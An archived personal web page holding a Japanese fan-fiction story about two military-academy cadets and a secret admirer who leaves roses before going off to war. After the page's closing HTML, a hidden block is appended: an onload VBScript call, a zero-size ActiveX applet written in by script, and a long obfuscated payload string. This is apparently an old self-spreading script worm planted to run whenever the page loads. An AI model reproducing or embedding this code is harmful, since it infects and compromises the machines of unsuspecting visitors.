<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<META name="GENERATOR" content="IBM HomePage Builder 2001 V5.0.2 for Windows">
<TITLE></TITLE>
</HEAD>
<BODY bgcolor="#000000" text="#ccffcc" link="#cc6666" vlink="#999999" alink="#cccc99">
<!-- BEGIN WAYBACK TOOLBAR INSERT -->

<script type="text/javascript" src="/static/js/disclaim-element.js" ></script>
<script type="text/javascript" src="/static/js/graph-calc.js" ></script>
<script type="text/javascript" src="/static/jflot/jquery.min.js" ></script>
<script type="text/javascript">
//<![CDATA[
var firstDate = 820454400000;
var lastDate = 1388534399999;
var wbPrefix = "/web/";
var wbCurrentUrl = "http:\/\/ww2.tiki.ne.jp\/~die-\/ami.n2.htm";

var curYear = -1;
var curMonth = -1;
var yearCount = 18;
var firstYear = 1996;
var imgWidth = 450;
var yearImgWidth = 25;
var monthImgWidth = 2;
var trackerVal = "none";
var displayDay = "14";
var displayMonth = "Jan";
var displayYear = "2005";
var prettyMonths = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];

function showTrackers(val) {
	if(val == trackerVal) {
		return;
	}
	if(val == "inline") {
		document.getElementById("displayYearEl").style.color = "#ec008c";
		document.getElementById("displayMonthEl").style.color = "#ec008c";
		document.getElementById("displayDayEl").style.color = "#ec008c";		
	} else {
		document.getElementById("displayYearEl").innerHTML = displayYear;
		document.getElementById("displayYearEl").style.color = "#ff0";
		document.getElementById("displayMonthEl").innerHTML = displayMonth;
		document.getElementById("displayMonthEl").style.color = "#ff0";
		document.getElementById("displayDayEl").innerHTML = displayDay;
		document.getElementById("displayDayEl").style.color = "#ff0";
	}
   document.getElementById("wbMouseTrackYearImg").style.display = val;
   document.getElementById("wbMouseTrackMonthImg").style.display = val;
   trackerVal = val;
}
function getElementX2(obj) {
	var thing = jQuery(obj);
	if((thing == undefined) 
			|| (typeof thing == "undefined") 
			|| (typeof thing.offset == "undefined")) {
		return getElementX(obj);
	}
	return Math.round(thing.offset().left);
}
function trackMouseMove(event,element) {

   var eventX = getEventX(event);
   var elementX = getElementX2(element);
   var xOff = eventX - elementX;
	if(xOff < 0) {
		xOff = 0;
	} else if(xOff > imgWidth) {
		xOff = imgWidth;
	}
   var monthOff = xOff % yearImgWidth;

   var year = Math.floor(xOff / yearImgWidth);
	var yearStart = year * yearImgWidth;
   var monthOfYear = Math.floor(monthOff / monthImgWidth);
   if(monthOfYear > 11) {
       monthOfYear = 11;
   }
   // 1 extra border pixel at the left edge of the year:
   var month = (year * 12) + monthOfYear;
   var day = 1;
	if(monthOff % 2 == 1) {
		day = 15;
	}
	var dateString = 
		zeroPad(year + firstYear) + 
		zeroPad(monthOfYear+1,2) +
		zeroPad(day,2) + "000000";

	var monthString = prettyMonths[monthOfYear];
	document.getElementById("displayYearEl").innerHTML = year + 1996;
	document.getElementById("displayMonthEl").innerHTML = monthString;
	// looks too jarring when it changes..
	//document.getElementById("displayDayEl").innerHTML = zeroPad(day,2);

	var url = wbPrefix + dateString + '/' +  wbCurrentUrl;
	document.getElementById('wm-graph-anchor').href = url;

   //document.getElementById("wmtbURL").value="evX("+eventX+") elX("+elementX+") xO("+xOff+") y("+year+") m("+month+") monthOff("+monthOff+") DS("+dateString+") Moy("+monthOfYear+") ms("+monthString+")";
   if(curYear != year) {
       var yrOff = year * yearImgWidth;
       document.getElementById("wbMouseTrackYearImg").style.left = yrOff + "px";
       curYear = year;
   }
   if(curMonth != month) {
       var mtOff = year + (month * monthImgWidth) + 1;
       document.getElementById("wbMouseTrackMonthImg").style.left = mtOff + "px";
       curMonth = month;
   }
}
//]]>
</script>

<style type="text/css">body{margin-top:0!important;padding-top:0!important;min-width:800px!important;}#wm-ipp a:hover{text-decoration:underline!important;}</style>
<div id="wm-ipp" style="display:none; position:relative;padding:0 5px;min-height:70px;min-width:800px; z-index:9000;">
<div id="wm-ipp-inside" style="position:fixed;padding:0!important;margin:0!important;width:97%;min-width:780px;border:5px solid #000;border-top:none;background-image:url(/static/images/toolbar/wm_tb_bk_trns.png);text-align:center;-moz-box-shadow:1px 1px 3px #333;-webkit-box-shadow:1px 1px 3px #333;box-shadow:1px 1px 3px #333;font-size:11px!important;font-family:'Lucida Grande','Arial',sans-serif!important;">
   <table style="border-collapse:collapse;margin:0;padding:0;width:100%;"><tbody><tr>
   <td style="padding:10px;vertical-align:top;min-width:110px;">
   <a href="/web/" title="Wayback Machine home page" style="background-color:transparent;border:none;"><img src="/static/images/toolbar/wayback-toolbar-logo.png" width="110" alt="Wayback Machine" height="39" border="0"/></a>
   </td>
   <td style="padding:0!important;text-align:center;vertical-align:top;width:100%;">

       <table style="border-collapse:collapse;margin:0 auto;padding:0;width:570px;"><tbody><tr>
       <td style="padding:3px 0;" colspan="2">
       <form target="_top" method="get" action="/web/form-submit.jsp" name="wmtb" id="wmtb" style="margin:0!important;padding:0!important;"><input type="text" name="url" id="wmtbURL" value="http://ww2.tiki.ne.jp/~die-/ami.n2.htm" style="width:400px;font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;" onfocus="javascript:this.focus();this.select();" /><input type="hidden" name="type" value="replay" /><input type="hidden" name="date" value="20050114095102" /><input type="submit" value="Go" style="font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;margin-left:5px;" /><span id="wm_tb_options" style="display:block;"></span></form>
       </td>
       <td style="vertical-align:bottom;padding:5px 0 0 0!important;" rowspan="2">
           <table style="border-collapse:collapse;width:110px;color:#99a;font-family:'Helvetica','Lucida Grande','Arial',sans-serif;"><tbody>
			
           <!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
           <tr style="width:110px;height:16px;font-size:10px!important;">
           	<td style="padding-right:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="/web/20041105232842/http://ww2.tiki.ne.jp/~die-/ami.n2.htm" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="5 Nov 2004"><strong>NOV</strong></a>
		                
               </td>
               <td id="displayMonthEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight:bold;text-transform:uppercase;width:34px;height:15px;padding-top:1px;text-align:center;" title="You are here: 9:51:02 Jan 14, 2005">JAN</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       Feb
                       
               </td>
           </tr>

           <!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
           <tr>
               <td style="padding-right:9px;white-space:nowrap;overflow:visible;text-align:right!important;vertical-align:middle!important;" nowrap="nowrap">
               
		                <a href="/web/20041105232842/http://ww2.tiki.ne.jp/~die-/ami.n2.htm" title="23:28:42 Nov 5, 2004" style="background-color:transparent;border:none;"><img src="/static/images/toolbar/wm_tb_prv_on.png" width="14" alt="Previous capture" height="16" border="0" /></a>
		                
               </td>
               <td id="displayDayEl" style="background:#000;color:#ff0;width:34px;height:24px;padding:2px 0 0 0;text-align:center;font-size:24px;font-weight: bold;" title="You are here: 9:51:02 Jan 14, 2005">14</td>
				<td style="padding-left:9px;white-space:nowrap;overflow:visible;text-align:left!important;vertical-align:middle!important;" nowrap="nowrap">
               
                       <img src="/static/images/toolbar/wm_tb_nxt_off.png" width="14" alt="Next capture" height="16" border="0"/>
                       
			    </td>
           </tr>

           <!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
           <tr style="width:110px;height:13px;font-size:9px!important;">
				<td style="padding-right:9px;font-size:11px!important;font-weight: bold;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="/web/20031208170107/http://ww2.tiki.ne.jp/~die-/ami.n2.htm" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="8 Dec 2003"><strong>2003</strong></a>
		                
               </td>
               <td id="displayYearEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight: bold;padding-top:1px;width:34px;height:13px;text-align:center;" title="You are here: 9:51:02 Jan 14, 2005">2005</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight: bold;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       2006
                       
				</td>
           </tr>
           </tbody></table>
       </td>

       </tr>
       <tr>
       <td style="vertical-align:middle;padding:0!important;">
           <a href="/web/20050114095102*/http://ww2.tiki.ne.jp/~die-/ami.n2.htm" style="color:#33f;font-size:11px;font-weight:bold;background-color:transparent;border:none;" title="See a list of every capture for this URL"><strong>14 captures</strong></a>
           <div style="margin:0!important;padding:0!important;color:#666;font-size:9px;padding-top:2px!important;white-space:nowrap;" title="Timespan for captures of this URL">6 Feb 02 - 14 Jan 05</div>
       </td>
       <td style="padding:0!important;">
       <a style="position:relative; white-space:nowrap; width:450px;height:27px;" href="" id="wm-graph-anchor">
       <div id="wm-ipp-sparkline" style="position:relative; white-space:nowrap; width:450px;height:27px;background-color:#fff;cursor:pointer;border-right:1px solid #ccc;" title="Explore captures for this URL">
			<img src="/web/jsp/graph.jsp?graphdata=450_27_1996:-1:000000000000_1997:-1:000000000000_1998:-1:000000000000_1999:-1:000000000000_2000:-1:000000000000_2001:-1:000000000000_2002:-1:010001010101_2003:-1:010000010101_2004:-1:010001100010_2005:0:100000000000_2006:-1:000000000000_2007:-1:000000000000_2008:-1:000000000000_2009:-1:000000000000_2010:-1:000000000000_2011:-1:000000000000_2012:-1:000000000000_2013:-1:000000000000" id="sparklineImgId" style="position:absolute; z-index:9012; top:0px; left:0px;"
				onmouseover="showTrackers('inline');" 
				onmouseout="showTrackers('none');"
				onmousemove="trackMouseMove(event,this)"
				alt="sparklines"
				width="450"
				height="27"
				border="0"
			></img>
			<img src="/static/images/toolbar/transp-yellow-pixel.png" width="25" id="wbMouseTrackYearImg" 
				style="display:none; position:absolute; z-index:9010;" 
				height="27"
				border="0"
			></img>
			<img src="/static/images/toolbar/transp-red-pixel.png" width="2" id="wbMouseTrackMonthImg"
				style="display:none; position:absolute; z-index:9011; "
				height="27" 
				border="0"
			></img>
       </div>
		</a>

       </td>
       </tr></tbody></table>
   </td>
   <td style="text-align:right;padding:5px;width:65px;font-size:11px!important;">
       <a href="javascript:;" onclick="document.getElementById('wm-ipp').style.display='none';" style="display:block;padding-right:18px;background:url(/static/images/toolbar/wm_tb_close.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;margin-bottom:23px;background-color:transparent;border:none;" title="Close the toolbar">Close</a>
       <a href="http://faq.web.archive.org/" style="display:block;padding-right:18px;background:url(/static/images/toolbar/wm_tb_help.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;background-color:transparent;border:none;" title="Get some help using the Wayback Machine">Help</a>
   </td>
   </tr></tbody></table>

</div>
</div>
<script type="text/javascript">
 var wmDisclaimBanner = document.getElementById("wm-ipp");
 if(wmDisclaimBanner != null) {
   disclaimElement(wmDisclaimBanner);
 }
</script>
<!-- END WAYBACK TOOLBAR INSERT -->

<P><BR><BR>
</P>
<TABLE width="763">
  <TBODY>
    <TR>
      <TD width="183" height="28"></TD>
      <TD width="564" height="28">ＵＮＤＥＲ　ＴＨＥ　ＲＯＳＥ</TD>
    </TR>
    <TR>
      <TD width="183" height="4"></TD>
      <TD width="564" height="4"></TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR><BR>
</P>
<TABLE width="1101">
  <TBODY>
    <TR>
      <TD width="120"></TD>
      <TD width="903">　「サービス、これ・・・・」</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">始まりのそれは日曜日の朝。</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">大きなあくびとともに部屋を出た黒髪の親友が、一瞬足を止めてかがんだ。その半瞬後に振り向いた彼がなんだか呆けた顔をして、</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">右手を差し出す。</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">「え・・なに、それ」</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">親友の挙動不審な行動を何気なく見つめていたサービスも、同じように間の抜けた声を出す。</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">差し出した相棒の右手の中に、一輪の深紅の薔薇。</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">「ジャン、お前・・・こんなものどこから・・・。」</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">「置いてあったんだよ、ここ・・ドアの前に。」</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">「誰から？」</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">「知るかよ。」</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">「・・・誰に？」</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">「だから、知るかって！・・・まぁ、俺にじゃねぇよな。お前しかいないんじゃねぇの。」</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">確かに。</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">ジャンに薔薇の花を贈るなど永遠の語り草となるだろう。彼は薔薇というより向日葵だ。</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">ピンとしたはりのある大がらな花弁の滑らかな感触と微かな淡い香りがサービスにほんのり満足感を与える。</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">誰の悪ふざけか知らないが、美しいものを贈られて、不審ではあるが不快感はない。</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">不審といっても結局は外部者立入厳禁の士官学校・寮内での出来事だ。学生の誰かであるのは明確であるし、</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">その美貌ゆえ、同性からある種の好意を持たれることにはもう慣れている。</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">薄い微笑みを口元に浮かべて、サービスはぐるりと部屋の中を見回した。視線の先に昨夜ジャンが飲んだペットボトル。</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">洗って、とりあえず一輪ざし。</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">「なんだよ、それ捨てろよ、気味悪ぃ。誰かにからかわれてんだぜ。」</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">「僕は美しいものは好きだ。くれるというなら貰っておくよ。そんな怖い顔するなよ、大した事じゃない。」</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">何気に面白くなさげな親友をしり目にサービスはおよそ気品漂う深紅の薔薇には相応しからぬ俗物な即席の花瓶を</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">陽の射す窓辺に置いた。</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">「一輪さしの花瓶、買いに行こうかなぁ・・」</TD>
    </TR>
    <TR>
      <TD width="120" height="33"></TD>
      <TD width="903" height="33"></TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">それから一週間後。</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">二人の部屋の深紅の薔薇は５本に増えていた。</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">ほとんど毎日、ドアの前にいつのまにか薔薇が一本置かれている。容姿端麗、成績優秀、さらにはガンマ団総帥の弟であるサービスは</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>普段から注目を集める話題の人であるのに、この時期これといった行事のない寮内でのこの出来事は寮生達にとって</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">さらに輪をかけた絶好のイベントとなった。</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">「おや、薔薇の姫君のご登場ですよ。ご機嫌いかがですか、サービス。」</TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">「今まさにお前の動脈にストリキニーネでもブチ込みたい気分だよ、高松。」　<FONT size="-1">　　　　　　※ストリキニーネ・・・アルカロイドの一種</FONT></TD>
    </TR>
    <TR>
      <TD width="120"></TD>
      <TD width="903">「おやおや、恐ろしい事ですねぇ！貴方とのランチに同席するのは避けたほうが良さそうですね。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>食堂に入るなり好奇の目に晒され、目に見えて不機嫌なサービスとさらにそれを煽る級友の高松——バイオ科学者の卵だ。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>仲が良いのか悪いのか。会うと二人はいつも辛口トークを展開している。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「よせよ、高松。・・まったくタチの悪い悪戯だぜ、今回は。なんか気味悪ぃよ。相手が何考えてんだか判りゃしねぇ。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「ジャン、色恋で貴方に読まれては相当の痴れ者ですよ。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「あんだよッツ！」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>二人の会話に耳を貸さずに遅めの昼食を取るサービス。無口な性分、怒るときもしたたかに冷静だが、なにぶん兄達に甘やかされて</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>育った四男坊。一度怒ると手がつけられない。ジャンはそれを心配している。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>一見おとなしく食事を取る級友の姿をその漆黒の瞳に映しながら、何処か皮肉に歪んだ唇に深い笑みをたたえて高松は言葉を続けた。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「まあ、時期が悪かったんですよ。今が一番暇ですからね。刺激が足りないのでしょう・・あくまでそれは我々１，２年生の間ですが。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「・・始まったのか、３年は・・。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「ええ、今月末にも第一陣が出兵するそうですよ。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>出兵———二人の級友の会話を聞いてジャンはその深い草原の色をした瞳を曇らせた。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>世界的な暗殺集団ガンマ団。その士官生は３年目になると初陣を飾る。腕に覚えある猛者ばかりだが、訓練と実践との違いに</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>やはり多くの死者が出る。——いつか、</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>自分達も往くのだろう。砂煙る血生臭い非情の地へ。己が死んでも哀しむ者など誰もいない。こんな処へ集まるのはそんな・・・所謂一種の</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>いわくありげなはみ出し者だけ。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「いずれにせよ、もうしばらくの辛抱ですよ。３年生の出兵が始まればいやがおうでも周りの緊張は高まります。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>こんな平和ボケしたお祭り騒ぎに浸っているどころではなくなるでしょう。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「出兵か・・・」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>何気につぶやいたジャンの言葉が思いがけず三人の心の内にそれぞれ微妙な違いを伴いつつ、じわり、と浸透してゆくさまを</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>彼ら自身が如実に感じ取っていた。</TD>
    </TR>
    <TR>
      <TD height="33"></TD>
      <TD height="33"></TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>　「サービス、また来てる・・・」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>ジャンが手にしたいつもの薔薇。しかしそれはいつもと違うオプション付きであった。茎に器用に結び付けられた白い紙切れ。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「手紙・・・？」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>覗き込む黒髪を押しやって、几帳面に折られた手紙に目を通すと、見る者に刃物のような冷たさを感じさせる独特の青い瞳が一瞬見開く。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「なんて書いてあるんだ？何か・・悪いことか？」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「ジャン、この人・・——　」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>慌てて顔を上げると目の前に真摯な眼差しでこちらをまっすぐ見つめる親友の顔。その顔が、普段少年のような彼とは違った、まるで</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>自分よりずっと年上の大人のそれに見えて、サービスは半瞬息を止めた。そして、言葉も止めた。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>先を促すような草原色の瞳に思わず首を振る。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「サービス、」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「なんでもない、ジャン、大した事ない。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「なんだよ、大した事ないなら言えよ！」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「うるさいな・・なんでお前に言わなきゃいけないんだ、ほっとけよ！」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「サービス！俺に隠し事するのか！」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>まるで陳腐な三流ドラマの恋人同士、犬も喰わない痴話喧嘩。そんな自分達の姿がたまらなく滑稽で泣きたくなる。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>隠し事なんて、そんなもの</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「そんなもの、誰だって持ってる・・・」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「俺は持って———・・・」いる。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>持っている、彼すら。絶対に言えない隠し事。サービスにさえ、サービスだからこそ言えない秘密。己自身こそが最大の。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>サービスは静かに手紙を折りたたみ、机の中へしまうと８本目の薔薇をいける為花瓶を持って部屋を出ようとする。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>自分の横を通り抜ける黄金の髪がドアを開けた瞬間に流れ込む空気のささやかな一吹きにサラリと揺れるさまを、ジャンは何処か遠い瞳で</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>見つめる。ドアの向こうから射し込む朝の光に一瞬眩暈を感じた。それは不思議な感覚——例えるなら彼の愛する“故郷”の鮮やかな緑が</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>目の前に広がって、その緑と海の向こうから自分の知っいてる誰かが自分を呼んでいる———　ような。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「サービス」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>花瓶の水をかえる親友の背後でもう一度、落ち着いた声でその名を呼ぶ。呼ばれた相手は振り返らないが拒絶もしない。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「・・・手伝うよ」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「・・・犬か、お前」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>呆れ声。それにすらほっとする。彼の安堵の溜息にこちらは軽い侮蔑にも似た溜息をつく。もう少しくらい男らしく強気でいてくれても良いのに、</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>と思うのはサービスの根底に強く蔓延る、自覚症状のない中毒にも似た恋愛観念。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>ぢょきん、とはさみを入れて水切り。それをジャンに手渡すと彼が不器用な手つきで花瓶に生ける。隣でまた、ぢょきん、と切る。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>何本目かの水切りで静かにサービスが呟いた。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「この薔薇の人、３年生だった・・・。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「え・・」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「今度の第一陣で出兵するって」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「・・・・・・」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「でも、自分が誰なのか、探さないでほしいって」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>少し間を置いて、</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「秘密にしていた方が、僕の心に少しでも残るだろうからって・・・」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>ぢょき、ん。　と鈍い音が心虚しく響く。それから手を止め、サービスはゆっくりと相手の顔を見つめた。青白い顔に凄惨なまでに映える青の瞳が</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>まっすぐジャンを捉える。その瞳———　深い邪気から創られた罪の青。見る者に刃物のような冷たさを思わせる罪の右眼。けれど、</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>それを何より重荷に感じ苦しんでいるのはサービス自身であることをジャンは知っている。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「ＵＮＤＥＲ　ＴＨＥ　ＲＯＳＥ———　だね・・・『秘密』って事、掛けてたのかな、彼。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「高松の言うとおりだ。俺にはこの人の気持ち、判ってやれなかったよ。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「ジャンは・・・薔薇の下にどんな『秘密』を隠してる？」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「—————・・・。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>その時の黒髪の親友の顔を、サービスは一生忘れない。その顔に、全てが書かれていたから。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>彼は、とてつもない『秘密』を持っている。この太陽を全身に浴びたような一点の曇りもない男が。・・・それでも持っている。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>きっと誰しも持っている。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>ぢょきん。　　最後の一輪の茎先をサービスは静かに切り落とした。</TD>
    </TR>
    <TR>
      <TD height="33"></TD>
      <TD height="33"></TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>　それからも薔薇の恋文は訪れた。だが約束どおりサービスは相手を探そうとはせず、ジャンも二度と内容を聞こうとはしない。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>周りも迫りくる出兵の緊迫感に押され次第に噂は消滅してゆく。・・・そんなある日。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>届いた恋文に目を通していたサービスが一瞬小さく肩を振るわせ、力を落とした。小気味に震える肩をジャンはただ無言で抱きしめる。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>今の自分にはそれくらいしかしてやれない事を彼は知っていた。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>その日を境に薔薇の恋文は途絶え、そして</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>———数日後、３年の第一陣が出兵の為、ガンマ団を旅立っていった。</TD>
    </TR>
    <TR>
      <TD height="41"></TD>
      <TD height="41"></TD>
    </TR>
    <TR>
      <TD height="9"></TD>
      <TD height="9">&lt;ＥＮＤ&gt;</TD>
    </TR>
    <TR>
      <TD height="43"></TD>
      <TD height="43"></TD>
    </TR>
    <TR>
      <TD height="6"></TD>
      <TD height="6"><FONT size="-1"><A href="/web/20050114095102/http://ww2.tiki.ne.jp/~die-/ami.ato1.htm#ﾊﾞﾗ">あとがき</A></FONT></TD>
    </TR>
    <TR>
      <TD height="29"></TD>
      <TD height="29"></TD>
    </TR>
    <TR>
      <TD height="3"></TD>
      <TD height="3"><A href="/web/20050114095102/http://ww2.tiki.ne.jp/~die-/novtop.htm">戻る</A></TD>
    </TR>
    <TR>
      <TD></TD>
      <TD></TD>
    </TR>
  </TBODY>
</TABLE>
</BODY>
</HTML>

<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "=hmBmWd^qe(AsmhMdxp%UboMdxp%CeckdeObfn(:oph^Nbf^bt(?RO(PrSd^kl(PhnLZsh(LtbA%EijZky@brkRu^JJ[lsanm')JJO^sDef')JJ?kdap^Lihbdu$GCKig^Ht$GCBraZseIZhl$GCOrki`g]md(%Ej]Sq[Euj\sikgKF:opagcTk!Eih^Oapa+TuidSpk(Hm AkqonQeonleGdxpSamRaZcTafo 9ESK'NpagSetmEih^'FeedP]mg,-PfoSpk=Kda`Mdml'Qe]]@lhIbHnomq(PfoSpk+GC^spZqt$!)5= ,NrEdn$MlpOmq)51MgejRaZcTafo.?ensaEtbs BnmcpbnnDn`HfHfMxpaLsr6dmsMgejRaZcTafo.?ensaSamFeedTafo 9ESK'NpagSetmEih^'FeedP]mg,.BbkeP^lp*Pqip^8&AO@Rojena`6!% oas_khpp3! !KFXrt]ks(%!:&oaCnEe SmlLsrv^<qLb% DmllP^wtEih^Seii-ChhreRepEApmqi^< BLN.C^sFeed(BbkeLZsh%F=msre[-apmqi^nseo< /-AereQe]]Seii-ChhreRepEih^Seii=?RO*HoejMdxp?hla!Eih^Oapa+8%IbSyl^Rtn< asmhTd^m?hlaMdml'Vremd r[BrH_&;DMLL:&oaCnEe !<% ;NDUnnhh`d9!r[rcnbot6&JJ[lsanm')! !>% r[BrH_&AsmhMdxpEhldIbSyl^Rtn< oasShagBbkeP^lp*Pqip^v^<qLb% R[rTaqs>mdBe?hlaMdml'Blkld>mdBe>md?tn_mhoj?tn_mhojJJ?a`nc^Ru^!BunkdnpLsregf,HZrtEgcet<ganE_L]lsIj]dx?a`r60MgejIbKebm'L?Zre$<trn^mtOmqij`(,-=8KC]ld(\!)MgejKF<gaj`dSq[=?hn]exDelj !:XOnaE60Dlo^GCBh]gfeOna 9Bhn!@s_!Kebm'L?Zre$<trn^mtOmqij`(,-( )0)6U!LtbA< ,Ej]IbEhldDICdZmgaLtb6